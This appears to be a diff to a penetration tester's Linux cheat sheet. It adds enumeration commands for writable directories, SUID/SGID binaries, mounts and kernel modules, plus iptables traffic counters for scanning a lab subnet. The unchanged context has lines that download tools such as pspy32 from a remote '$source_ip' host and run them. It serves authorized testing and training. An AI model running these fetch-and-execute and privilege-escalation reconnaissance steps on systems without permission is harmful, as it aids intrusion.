@@ -30,6 +30,38 @@ wget http://$source_ip/tools_linux/checksec; bash checksec --kernel | tee checks
 wget http://$source_ip/tools_linux/checksec; bash checksec --fortify-proc=1 | tee checksec.proc.out
 ```
 
+### General Enumeration 
+
+Writable files:
+```
+find / -writable -type d 2>/dev/null
+```
+
+SUID:
+```
+find / -perm -u=s -type f 2>/dev/null
+```
+
+SGID:
+```
+find / -perm -g=s -type f 2>/dev/null
+```
+
+Mounted and unmounted volumes:
+```
+cat /etc/fstab
+mount
+lsblk
+```
+
+Device drivers and kernel modules:
+```
+lsmod
+```
+```
+/sbin/modinfo <module_name>
+```
+
 ## Process monitoring
 ```
 wget http://$source_ip/tools_linux/pspy32; chmod +x pspy32; ./pspy32
@@ -153,9 +185,15 @@ tcpdump -A -n 'tcp[13] = 24' -r password_cracking_filtered.pcap
 
 Create traffic counter for specific net
 ```
+iptables -Z
 iptables -N subnet_scan
 iptables -A INPUT -d 10.11.1.0/24 -j subnet_scan
 iptables -vL INPUT
+```
+
+```
+iptables -Z
+iptables -vn -L
 ```
 
 Packet and byte counter using iptables
